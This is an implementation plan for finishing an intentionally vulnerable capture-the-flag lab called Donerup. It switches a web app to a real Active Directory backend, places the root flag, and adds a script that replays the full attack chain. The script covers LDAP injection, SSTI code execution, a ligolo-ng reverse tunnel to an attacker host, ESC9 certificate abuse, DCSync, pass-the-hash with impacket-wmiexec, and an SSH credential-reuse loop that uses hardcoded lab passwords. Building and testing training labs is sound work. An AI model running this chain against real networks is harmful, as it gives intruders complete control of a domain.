# Donerup End-to-End Replay (Plan 4 of 4) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Switch the web app from the mock LDAP backend to the real DC from Plan 3, replay the entire attack chain end-to-end (recon → LDAP injection → SSTI RCE → rabbit-hole dead end → real credential discovery → pivot → AD enumeration → ESC9 → DCSync → both flags), place `root.txt`, and close every open verification item left in spec §11.

**Architecture:** No new components — this plan wires Plans 1–3 together and proves the seams hold. Plan 1's mock LDAP backend is replaced with a real bind to Plan 3's DC over the route Plan 2 built; the same verified payloads from Plan 1 must keep working against the real AD, since spec §11 explicitly flags the mock's filter parser as not guaranteed identical to real AD. A single orchestration script replays every phase of the chain and reports pass/fail per phase, mirroring Plan 1's `integration_smoke.py` style but spanning all three plans.

**Tech Stack:** bash, Python (`requests`, reused from Plan 1), `nmap`, `certipy`, `impacket`, Docker Compose, PowerShell (for `root.txt` placement on the DC).

**Relationship to other plans:** Consumes `build/docker-compose.yml` and `build/web/tests/integration_smoke.py` from Plan 1 (`2026-08-24-donerup-web-app.md`), the pivot path and `build/network/config.env` from Plan 2 (`2026-08-24-donerup-network-pivot.md`), and the DC/ESC9 chain from Plan 3 (`2026-08-24-donerup-ad-escalation.md`). This is the last plan in the series — nothing depends on it.

**Source spec:** `/home/kal/Desktop/htb-box/donerup-htb-insane-design-v2.md` (v3), §10 and §11 (and the full chain map in §2).

---

## File Structure

```
htb-box/
  build/
    web/
      .env.real-ldap.example      # template for the real LDAP bind config
    dc-provisioning/
      06-place-root-flag.ps1
      checks/
        check-root-flag.ps1
    exploit/
      full-chain-replay.sh        # orchestrates every phase, phase-by-phase PASS/FAIL
  .gitignore                       # MODIFY: exclude the real (non-example) LDAP secrets file
  docker-compose.yml                # MODIFY (via build/docker-compose.yml): real LDAP bind, not mock
```

---

### Task 1: Switch the web app from mock LDAP to the real DC

**Files:**
- Create: `build/web/.env.real-ldap.example`
- Modify: `build/docker-compose.yml`
- Modify: `.gitignore`

- [ ] **Step 1: Write the real-LDAP config template**

`build/web/.env.real-ldap.example`:

```
LDAP_SERVER_HOST=dc01.donerup.htb
LDAP_BIND_DN=CN=svc_ldap,OU=Service Accounts,DC=donerup,DC=htb
LDAP_BIND_PASSWORD=LdapBind2026!Str0ng
```

This is the file spec §5 describes the player discovering post-RCE (readable inside the container via its process environment, e.g. `cat /proc/self/environ` or `env`, once `docker-compose` injects it) — it is the "real path" the `legacy-auth-db` rabbit hole is designed to distract from.

- [ ] **Step 2: Exclude the real secrets file from git, keep the example committed**

Add to `.gitignore`:

```
build/web/.env.real-ldap
```

- [ ] **Step 3: Create the real (gitignored) file with Plan 3's actual `svc_ldap` password**

```bash
cp build/web/.env.real-ldap.example build/web/.env.real-ldap
```

The password in the copied file must match whatever `svc_ldap`'s password actually is on the Plan 3 DC (`LdapBind2026!Str0ng` if Plan 3's Task 2 script was used unmodified).

- [ ] **Step 4: Switch the `web` service off mock mode**

In `build/docker-compose.yml`, replace the `web` service's `environment`/`LDAP_MODE` line:

```yaml
  web:
    build: ./web
    ports:
      - "8080:5000"
    environment:
      FLASK_SECRET_KEY: dev-only-not-for-prod
    env_file:
      - ./web/.env.real-ldap
    cap_add:
      - NET_ADMIN
    extra_hosts:
      - "dc01.donerup.htb:10.10.20.10"
    networks:
      dmz: {}
      internal-ad:
        ipv4_address: 172.28.0.10
```

Removing `LDAP_MODE: mock` makes `get_ldap_connection_factory()` (Plan 1, `build/web/app/ldap_connection.py`) fall through to its `real` default, which reads `LDAP_SERVER_HOST`/`LDAP_BIND_DN`/`LDAP_BIND_PASSWORD` from the environment — now supplied by `.env.real-ldap` instead of the mock fixture data.

- [ ] **Step 5: Rebuild and re-run Plan 1's integration test against the real DC**

```bash
cd /home/kal/Desktop/htb-box/build
docker compose up -d --build
python3 web/tests/integration_smoke.py
```

Expected: every line prints `[PASS]`, ending with `ALL INTEGRATION CHECKS PASSED` — this is spec §11's "LDAP injection needs re-verification against real AD, not mock" item, now closed. If any check fails here that passed against the mock in Plan 1, the mismatch is between `ldap3`'s `MOCK_SYNC` filter parser and real AD's — fix the real AD side (most likely Plan 3 Task 2's `administrator` `info`-absence assertion or Plan 3 Task 4's template config), not the already-verified application code.

- [ ] **Step 6: Commit**

```bash
cd /home/kal/Desktop/htb-box
git add build/web/.env.real-ldap.example build/docker-compose.yml .gitignore
git commit -m "feat: switch web app to real LDAP bind, re-verify injection against real AD"
```

---

### Task 2: Place and verify `root.txt` on the DC

**Files:**
- Create: `build/dc-provisioning/06-place-root-flag.ps1`
- Create: `build/dc-provisioning/checks/check-root-flag.ps1`

- [ ] **Step 1: Write the check script**

`build/dc-provisioning/checks/check-root-flag.ps1`:

```powershell
$path = "C:\Users\Administrator\Desktop\root.txt"
if (Test-Path $path) {
    $content = (Get-Content $path -Raw).Trim()
    if ($content -match "^[a-f0-9]{32}$") {
        $aclOutput = (icacls $path) -join "`n"
        if ($aclOutput -match "Users:|Everyone:|Authenticated Users:|Domain Users:") {
            Write-Output "FAIL: root.txt ACL grants a broader principal than Administrators/SYSTEM"
            exit 1
        } elseif ($aclOutput -notmatch "Administrators:") {
            Write-Output "FAIL: root.txt ACL does not grant Administrators"
            exit 1
        } else {
            Write-Output "PASS: root.txt exists with a 32-char hex flag"
        }
    } else {
        Write-Output "FAIL: root.txt content is not a 32-char hex string"
        exit 1
    }
} else {
    Write-Output "FAIL: root.txt not found at $path"
    exit 1
}
```

- [ ] **Step 2: Run it on the DC to confirm the red state**

```powershell
.\checks\check-root-flag.ps1
```

Expected: `FAIL: root.txt not found at C:\Users\Administrator\Desktop\root.txt`.

- [ ] **Step 3: Write the placement script**

`build/dc-provisioning/06-place-root-flag.ps1`:

```powershell
# Per spec S10: root.txt lives on the DC, in the Administrator profile,
# placed once Domain Admin is achievable (Plan 3 Task 6).
$path = "C:\Users\Administrator\Desktop\root.txt"
# A re-run must not rotate a flag players may already hold -- same guard the
# user.txt generation in web/docker-entrypoint.sh uses. The ACL lockdown below
# is re-applied either way, so this script stays usable as a repair step.
if (Test-Path $path) {
    $status = "root.txt already present at $path, keeping the existing flag"
} else {
    $flag = ([guid]::NewGuid().Guid -replace '-', '')
    Set-Content -Path $path -Value $flag -NoNewline
    $status = "root.txt written to $path"
}
$aclOutput = icacls $path /inheritance:r /grant:r "Administrators:(R)" "SYSTEM:(F)"
if ($LASTEXITCODE -ne 0) {
    Write-Output $aclOutput
    Write-Output "FAIL: icacls did not apply the ACL lockdown on $path"
    exit 1
}
Write-Output $status
```

- [ ] **Step 4: Run it and confirm the green state**

```powershell
.\06-place-root-flag.ps1
.\checks\check-root-flag.ps1
```

Expected: `root.txt written to ...` then `PASS: root.txt exists with a 32-char hex flag`.

- [ ] **Step 5: Verify the flag is actually reachable using only the recovered administrator hash**

From the attacker box, after running Plan 3's `run-esc9-chain.sh` (which leaves `ADMIN_HASH` derivable from `/tmp/esc9-auth.out`):

```bash
ADMIN_HASH=$(grep -oP "Got hash for '[^']*administrator[^']*': \K[a-f0-9:]+" /tmp/esc9-auth.out)
DC_IP=10.10.20.10  # per Plan 2's config.env; no DNS resolution path to dc01.donerup.htb over the tunnel
impacket-wmiexec -hashes "$ADMIN_HASH" "donerup.htb/administrator@$DC_IP" \
    "type C:\\Users\\Administrator\\Desktop\\root.txt" | tr -d '\r'
```

Expected: the 32-character hex flag is printed (after stripping the CRLF line endings `impacket-wmiexec` returns) — proving the chain grants real administrative filesystem access on the DC, not just a recovered hash.

- [ ] **Step 6: Commit**

```bash
cd /home/kal/Desktop/htb-box
git add build/dc-provisioning/06-place-root-flag.ps1 build/dc-provisioning/checks/check-root-flag.ps1
git commit -m "feat: place root.txt on the DC and verify remote read via recovered admin hash"
```

---

### Task 3: Full chain replay script

**Files:**
- Create: `build/exploit/full-chain-replay.sh`

- [ ] **Step 1: Write the replay script**

`build/exploit/full-chain-replay.sh`:

```bash
#!/bin/bash
# One-shot replay of the entire Donerup chain: recon -> web foothold ->
# rabbit-hole dead end -> real credential discovery -> pivot -> AD enum
# -> ESC9 -> DCSync -> both flags. Run from the attacker box once Plans
# 1-3 are deployed and Task 1 of this plan has switched LDAP_MODE to real.
set -uo pipefail
cd "$(dirname "$0")" || exit 1

WEB_HOST="${1:-localhost:8080}"
DC_IP="${2:-10.10.20.10}"
SVC_LDAP_PASSWORD="${3:?usage: full-chain-replay.sh <web-host:port> <dc-ip> <svc_ldap-password>}"
FAILURES=0

check() {
    local name="$1" status="$2"
    if [ "$status" -eq 0 ]; then
        echo "[PASS] $name"
    else
        echo "[FAIL] $name"
        FAILURES=$((FAILURES + 1))
    fi
}

# Clear stale artifacts from a previous run so a PASS below can only be
# explained by evidence this invocation actually produced.
rm -f /tmp/replay-nmap.out /tmp/replay-rabbithole.out /tmp/esc9-auth.out

echo "== Phase 0: recon confirms the AD VLAN is not directly reachable =="
# NOTE: this phase is only meaningful when the AD VLAN actually exists and
# the pivot is not yet established. If DC_IP has no host behind it at all
# (e.g. no Plan 3 DC deployed in this environment), nmap -Pn will report
# filtered/closed/down regardless of any real isolation control, making
# the PASS below vacuous rather than a genuine isolation check. The
# "Nmap scan report for" guard below additionally distinguishes "nmap ran
# and saw nothing open" from "nmap produced no report at all" (e.g.
# --host-timeout expiring mid-scan, or a scan type nmap lacked privileges
# for) - without it, a run that produced no port table would read as
# confirmed isolation just because it also contains no "open" line.
nmap -p 389,445,88 -Pn --max-retries 1 --host-timeout 5s "$DC_IP" > /tmp/replay-nmap.out 2>&1
grep -q "Nmap scan report for" /tmp/replay-nmap.out && ! grep -qE "^(88|389|445)/tcp[[:space:]]+open" /tmp/replay-nmap.out
check "AD VLAN not reachable pre-pivot" $?

echo "== Phase 1: web foothold (LDAP injection + SSTI), real DC backend =="
BASE_URL="http://${WEB_HOST}" python3 ../web/tests/integration_smoke.py
check "web foothold chain (LDAP injection -> SSTI RCE)" $?

echo "== Phase 2: legacy-auth-db rabbit hole confirmed as a dead end =="
docker compose -f ../docker-compose.yml exec -T legacy-auth-db \
    mysql -uroot -p'Summer2019!' -e "SELECT username FROM legacy_auth.users;" > /tmp/replay-rabbithole.out 2>&1
grep -qE "^username$" /tmp/replay-rabbithole.out && ! grep -qiE "svc_ldap|administrator|jdoe" /tmp/replay-rabbithole.out
check "rabbit hole contains no real AD account names" $?

echo "== Phase 3: real credential discoverable via CHANGELOG.md hint =="
docker compose -f ../docker-compose.yml exec -T web grep -q "LDAP_BIND_DN" /home/appuser/CHANGELOG.md
check "migration hint points at the real LDAP bind config" $?

echo "== Phase 4 (manual): establish the pivot tunnel =="
echo "  1. Via the SSTI RCE foothold, drop a ligolo-ng agent binary into the container."
echo "  2. On the attacker box: ligolo-proxy -selfcert"
echo "  3. In the container (as appuser): ./agent -connect <attacker-ip>:11601 -ignore-cert"
echo "  4. In the ligolo-proxy session: session; ifconfig; route add 10.10.20.0/24 <tun-iface>"
read -rp "Press Enter once 10.10.20.0/24 is routed through the tunnel... "

echo "== Phase 5: AD enumeration + ESC9 confirmed on the real DC =="
../dc-provisioning/checks/check-esc9.sh "$DC_IP" "$SVC_LDAP_PASSWORD"
check "ESC9-vulnerable template confirmed over the tunnel" $?

echo "== Phase 6: full ESC9 -> DCSync chain =="
./run-esc9-chain.sh "$DC_IP" "$SVC_LDAP_PASSWORD"
check "ESC9 to DCSync chain" $?

echo "== Phase 7: user.txt present in the container =="
docker compose -f ../docker-compose.yml exec -T web test -s /home/appuser/user.txt
check "user.txt present in appuser home" $?

echo "== Phase 8: root.txt reachable on the DC via recovered admin hash =="
ADMIN_HASH=$(grep -oP "Got hash for '[^']*administrator[^']*': \K[a-f0-9:]+" /tmp/esc9-auth.out 2>/dev/null || true)
if [ -n "$ADMIN_HASH" ]; then
    # impacket-wmiexec returns Windows CRLF line endings, so strip the \r
    # before the anchored grep or a genuinely correct 32-hex flag would
    # fail to match "^[a-f0-9]{32}$".
    impacket-wmiexec -hashes "$ADMIN_HASH" "donerup.htb/administrator@$DC_IP" \
        "type C:\\Users\\Administrator\\Desktop\\root.txt" | tr -d '\r' | grep -qE "^[a-f0-9]{32}$"
    check "root.txt read via recovered administrator hash" $?
else
    check "root.txt read via recovered administrator hash" 1
fi

echo
if [ "$FAILURES" -eq 0 ]; then
    echo "ALL PHASES PASSED - full chain replay succeeded end to end"
else
    echo "$FAILURES PHASE(S) FAILED"
    exit 1
fi
```

- [ ] **Step 2: Run it**

```bash
chmod +x build/exploit/full-chain-replay.sh
cd build/exploit
./full-chain-replay.sh localhost:8080 10.10.20.10 'LdapBind2026!Str0ng'
```

Expected: all 8 phases print `[PASS]`, ending with `ALL PHASES PASSED - full chain replay succeeded end to end`.

- [ ] **Step 3: Commit**

```bash
cd /home/kal/Desktop/htb-box
git add build/exploit/full-chain-replay.sh
git commit -m "test: add full end-to-end chain replay across all three build plans"
```

---

### Task 4: Close the remaining spec §11 open items

**Files:** none created — this task is a verification checklist run against the live stack, with each item's outcome recorded in the Self-Review below.

- [ ] **Step 1: SSH (22) is a genuine dead end — no AD/service credential works**

```bash
for cred in "administrator:R00tP@ssw0rd2026!" "svc_ldap:LdapBind2026!Str0ng" "jdoe:CorrectHorseBattery1"; do
  user="${cred%%:*}"; pass="${cred##*:}"
  ssh_out="$(sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 "$user@<docker-host-ip>" exit 2>&1)"
  if echo "$ssh_out" | grep -q "Permission denied"; then
    echo "PASS: $user rejected over SSH"
  elif echo "$ssh_out" | grep -qE "Connection refused|No route to host|Network is unreachable|Operation timed out|Connection timed out|Could not resolve hostname|Name or service not known|Temporary failure in name resolution"; then
    echo "SKIP: sshd not reachable at <docker-host-ip>:22 - cannot test whether $user is rejected"
  else
    echo "FAIL: $user was not rejected over SSH (unexpected result: ${ssh_out:-<no output - connection appears to have succeeded>})"
  fi
done
```

Expected: in this project's current environment, sshd is not listening on the docker host, so `SKIP: sshd not reachable ...` is the expected (and only honest) outcome for all three credentials. Once/if sshd becomes reachable, the expected outcome is `PASS: ... rejected over SSH` for all three; a `FAIL: ... (unexpected result: ...)` would indicate a genuine credential-reuse problem.

- [ ] **Step 2: Tunnel DNS resolution for `donerup.htb`/`dc01` is documented and works**

```bash
certipy find -u svc_ldap -p 'LdapBind2026!Str0ng' -dc-ip 10.10.20.10 -ns 10.10.20.10 -stdout > /tmp/replay-dns-check.out 2>&1
if grep -q "Enumeration output:" /tmp/replay-dns-check.out; then
  echo "PASS: direct-IP LDAP bind + full certipy enumeration against the DC succeeded"
else
  echo "FAIL: certipy did not complete AD enumeration against 10.10.20.10 (see /tmp/replay-dns-check.out)"
fi
```

Expected: `PASS: direct-IP LDAP bind + full certipy enumeration against the DC succeeded`. Note that in this exact invocation, `-ns 10.10.20.10` is **not** exercised: `-dc-ip 10.10.20.10` is an IP literal, so certipy's `Target.from_options()` sets `target_ip` directly from `-dc-ip` and never calls its resolver — `-ns` only ever feeds that resolver. This check therefore validates that direct-IP LDAP enumeration against the DC works, not that DNS resolution or the `-ns <DC_IP>` workaround (spec §6.4) works; a `PASS` here should **not** be used to check off the spec §11 "Tunnel DNS via `-ns <DC_IP>`" item — that needs a separate check where `-ns` is actually load-bearing (e.g. a hostname target with no `-dc-ip`), which is out of scope for this step. The check gates on certipy's own `"Enumeration output:"` marker (only logged once `find` has completed a real LDAP connection and enumeration; on `certipy` v5.0.4, connection/auth failures raise before that point and are only ever logged, never causing a non-zero exit), not on the mere presence of the domain name — a failed run's error text can otherwise mention "donerup.htb" too. If certipy can't reach the DC, `FAIL: certipy did not complete AD enumeration against 10.10.20.10 (see /tmp/replay-dns-check.out)` is expected instead; `/tmp/replay-dns-check.out` captures both stdout and stderr (certipy logs, including its own errors, go to stdout; only the startup banner goes to stderr), so it shows the actual reason for the failure (e.g. a connection timeout because no DC is reachable, which is the current state of this lab) rather than an empty file.

- [ ] **Step 3: Reset resilience — reboot the Docker host and confirm nothing needs manual intervention**

```bash
sudo reboot
# after the host comes back up:
systemctl status donerup-ad-pivot.service --no-pager
sudo build/network/tests/run_isolation_test.sh   # after docker compose down
cd build && docker compose up -d
python3 web/tests/integration_smoke.py
```

Expected: `donerup-ad-pivot.service` shows `active (exited)` without being re-enabled by hand, the isolation test still prints `ALL ISOLATION CHECKS PASSED`, and the integration smoke test still prints `ALL INTEGRATION CHECKS PASSED` — confirming `After=docker.service` ordering (Plan 2 Task 3) survives a real reboot.

- [ ] **Step 4: Record the results**

No commit for this task — its only output is the Self-Review entries below. If any check fails, fix the underlying plan (most likely Plan 2's systemd unit for Step 3, or host `sshd_config` for Step 1) and re-run before considering Plan 4 complete.

---

## Self-Review

**Spec coverage:**
- §2 (full chain map, stage 0 through 8) → Task 3's `full-chain-replay.sh` phases 0–8 map directly to the chain map's rows.
- §10 (flag placement: `user.txt` post-foothold, `root.txt` post-Domain-Admin) → Task 2 (root.txt) and Task 3 Phase 7 (user.txt), closing the loop opened by Plan 1 Task 8 Step 3.
- §11 "LDAP injection needs re-verification against real AD, not mock" → Task 1, Step 5.
- §11 "AD provisioning must never write `info` for administrator" → already asserted in Plan 3 Task 2; re-exercised implicitly by Task 1 Step 5's full login-chain re-run against the real DC.
- §11 "ESC9 must be verified on a real DC" → already closed in Plan 3 Task 4; Task 3 Phase 5/6 here re-confirms it as part of the full replay, not in isolation.
- §11 "ESC10 tested separately" → closed in Plan 3 Task 7; intentionally **not** part of this plan's automated replay (it's a secondary, isolated finding, not a chain dependency).
- §11 "Tunnel DNS clarified" → Task 4, Step 2.
- §11 "Reset resilience tested" → Task 4, Step 3.
- §11 "SSH dead end confirmed via cred-reuse test" → Task 4, Step 1.

**Placeholder scan:** No TBD/TODO markers. Task 4 intentionally has no file deliverables (it's a verification-only task); this is stated explicitly, not left implicit.

**Type consistency:** `ADMIN_HASH` extraction regex in Task 2 Step 5 and Task 3's Phase 8 are identical (`grep -oP "Got hash for '[^']*administrator[^']*': \K[a-f0-9:]+"`), both reading the same `/tmp/esc9-auth.out` file produced by Plan 3's `run-esc9-chain.sh`. `DC_IP` (`10.10.20.10`), `svc_ldap`'s password (`LdapBind2026!Str0ng`), and the domain (`donerup.htb`) are consistent with Plan 2's `config.env` and Plan 3's provisioning scripts throughout.


